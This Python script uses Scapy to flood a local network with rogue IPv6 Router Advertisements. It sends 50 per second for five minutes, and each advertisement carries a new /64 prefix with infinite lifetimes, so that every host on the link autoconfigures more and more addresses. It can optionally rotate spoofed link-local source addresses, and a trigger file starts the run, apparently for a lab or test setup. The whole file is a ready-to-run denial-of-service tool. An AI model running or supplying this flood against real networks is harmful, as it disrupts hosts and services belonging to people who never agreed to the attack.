import os
import time
from scapy.all import send, get_if_hwaddr, conf
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptMTU, ICMPv6NDOptSrcLLAddr

# Script parameters
ATTACK_DURATION = 5 * 60 # Duration of the attack in seconds (5 minutes)
ATTACK_RATE = 50  # Rate of Router Advertisements per second
MTU = 1500
INTERFACE = "eth0"
MAC_ADDRESS = get_if_hwaddr(INTERFACE)  # Replace 'conf.iface' if needed with specific interface
PREFIX_BASE = "2001:db9:0:"
WITH_LLA_SPOOFING = False
# Link-local addresses of the rogue router
SRC_ADDRESSES = (
    "fe80::1",
    "fe80::2",
    "fe80::3",
    "fe80::4",
    "fe80::5"
)
ADDRESS_CHANGE_INTERVAL = 30  # Change the source address every 30 seconds

conf.iface = INTERFACE

def send_router_advertisements(interface: str, rate : int = ATTACK_RATE, duration : int = ATTACK_DURATION):
    """
    Sends Router Advertisements at a fixed rate for a specified duration, 
    with an incrementing prefix.

    :param str interface: Network interface to send the advertisements from.
    :param int rate: Number of advertisements to send per second.
    :param int duration: Total time to send advertisements, in seconds.
    """
    prefix_increment = 0  # Initial increment value

    # Calculate the interval between packets
    interval = 1.0 / rate

    # Send packets
    try:
        start_time = time.time()
        end_time = start_time + duration
        i = 0
        while time.time() < end_time:
            # Generate the current prefix
            prefix = f"{PREFIX_BASE}{prefix_increment:x}::"

            if WITH_LLA_SPOOFING:
                # Determine the source address based on elapsed time
                elapsed_time = time.time() - start_time
                address_index = int(elapsed_time // ADDRESS_CHANGE_INTERVAL) % len(SRC_ADDRESSES)
                src_address = SRC_ADDRESSES[address_index]

                # Construct the Router Advertisement packet
                ra_packet = IPv6(src=src_address, dst="ff02::1") / \
                            ICMPv6ND_RA() / \
                            ICMPv6NDOptMTU(mtu=MTU) / \
                            ICMPv6NDOptSrcLLAddr(lladdr=MAC_ADDRESS) / \
                            ICMPv6NDOptPrefixInfo(
                                prefixlen=64,
                                prefix=prefix,
                                L=1,  # On-link flag
                                A=1,  # Autonomous address-configuration flag
                                validlifetime=0xFFFFFFFF,
                                preferredlifetime=0xFFFFFFFF
                            )
            else:
                # Construct the Router Advertisement packet
                ra_packet = IPv6(dst="ff02::1") / \
                            ICMPv6ND_RA() / \
                            ICMPv6NDOptMTU(mtu=MTU) / \
                            ICMPv6NDOptSrcLLAddr(lladdr=MAC_ADDRESS) / \
                            ICMPv6NDOptPrefixInfo(
                                prefixlen=64,
                                prefix=prefix,
                                L=1,  # On-link flag
                                A=1,  # Autonomous address-configuration flag
                                validlifetime=0xFFFFFFFF,
                                preferredlifetime=0xFFFFFFFF
                            )

            # Send the packet
            send(ra_packet, iface=interface, verbose=False)

            # Update the prefix increment
            if prefix_increment == 0xFFFF:
                prefix_increment = 0
            else:
                prefix_increment += 1

            # Sleep to maintain the desired rate
            time.sleep(interval)

            # Print progress every second
            if (i + 1) % rate == 0:
                elapsed = time.time() - start_time
                print(f"Sent {(i + 1)} RAs in {elapsed:.2f} seconds...")
            
            i += 1
    except KeyboardInterrupt:
        print("\nStopped sending Router Advertisements.")
        
    print(f"Finished: Sent {i} RAs in {time.time() - start_time:.2f} seconds.")

if __name__ == "__main__":
    trigger_file = "start.trigger"
    # check if the trigger file exists
    while not os.path.exists(trigger_file):
        time.sleep(0.1)
    print("Start sending RAs...")

    send_router_advertisements(interface=INTERFACE, rate=ATTACK_RATE, duration=ATTACK_DURATION)
